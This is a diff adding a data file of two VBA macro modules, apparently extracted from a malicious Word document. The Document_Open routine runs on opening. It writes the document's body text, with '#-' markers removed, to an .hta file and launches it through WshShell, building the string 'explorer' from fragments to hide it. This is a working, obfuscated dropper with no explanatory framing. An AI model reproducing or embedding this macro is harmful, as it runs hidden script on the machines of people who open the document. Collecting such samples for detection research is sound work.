@@ -1,0 +1,4 @@
+
+
+[{'code': 'Attribute VB_Name = "ThisDocument"\r\nAttribute VB_Base = "1Normal.ThisDocument"\r\nAttribute VB_GlobalNameSpace = False\r\nAttribute VB_Creatable = False\r\nAttribute VB_PredeclaredId = True\r\nAttribute VB_Exposed = True\r\nAttribute VB_TemplateDerived = True\r\nAttribute VB_Customizable = True\r\nSub document_open()\r\nXR "prevNextUs.ht", ActiveDocument.Range.Text\r\nEnd Sub\r\n'}
+ {'code': 'Attribute VB_Name = "caPrev"\r\nSub XR(deNextDt, currPrevDe)\r\nOpen deNextDt & "a" For Output As #1\r\nPrint #1, Replace(currPrevDe, "#-", "")\r\nClose #1\r\nplPrev deNextDt, "exp"\r\nEnd Sub\r\nSub plPrev(deNextDt, exPrevCa)\r\nSet currUsPrev = New IWshRuntimeLibrary.WshShell\r\nWith currUsPrev\r\n.exec exPrevCa + "lorer " + deNextDt & "a"\r\nEnd With\r\nEnd Sub\r\n'}]
